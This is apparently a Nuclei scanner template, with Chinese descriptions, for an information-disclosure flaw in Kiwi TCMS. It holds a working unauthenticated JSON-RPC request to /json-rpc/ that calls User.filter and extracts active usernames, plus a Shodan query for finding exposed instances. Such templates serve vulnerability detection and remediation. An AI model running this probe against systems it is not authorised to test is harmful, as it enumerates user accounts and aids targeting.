id: kiwitcms-json-rpc

info:
  name: Kiwi TCMS - 信息泄露漏洞
  author: act1on3
  severity: high
  description: |
    该模板用于检测 Kiwi TCMS - 信息泄露漏洞。该类问题通常源于服务配置过宽、调试能力暴露或安全控制未按生产环境要求启用。模板会向 `/json-rpc/` 等位置发送探测请求，并结合响应状态、关键字、错误信息、时间差或外带交互等证据判断目标是否受影响。
  impact: |
    - 攻击者可能借助错误配置访问内部功能、敏感数据或原本不应公开的管理能力。
    - 配置缺陷常与其他漏洞组合使用，扩大暴露面并增加被定向攻击的概率。
  remediation: |
    - 按最小暴露原则收敛相关服务配置，关闭调试、示例、未使用插件和不必要接口。
    - 为管理入口和敏感接口增加认证、授权、来源限制和审计记录。
    - 复核生产环境基线，确认安全头、访问控制、默认配置和网络边界符合要求。
  reference:
    - https://hackerone.com/reports/968402
    - https://kiwitcms.org/blog/kiwi-tcms-team/2020/08/23/kiwi-tcms-86/
    - https://github.com/act1on3/nuclei-templates/blob/master/vulnerabilities/kiwi-information-disclosure.yaml
  classification:
    cpe: cpe:2.3:a:kiwitcms:kiwi_tcms:*:*:*:*:*:*:*:*
  metadata:
    max-request: 1
    vendor: kiwitcms
    product: kiwi_tcms
    shodan-query: title:"Kiwi TCMS - Login" http.favicon.hash:-1909533337
  tags: kiwitcms,exposure,misconfig,hackerone,vuln

http:
  - raw:
      - |
        POST /json-rpc/ HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json
        Accept-Encoding: gzip, deflate

        {"jsonrpc":"2.0","method":"User.filter","id": 1,"params":{"query":{"is_active":true}}}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        part: body
        words:
          - result
          - username
          - jsonrpc
          - is_active
        condition: and

    extractors:
      - type: json
        part: body
        json:
          - .result[].username
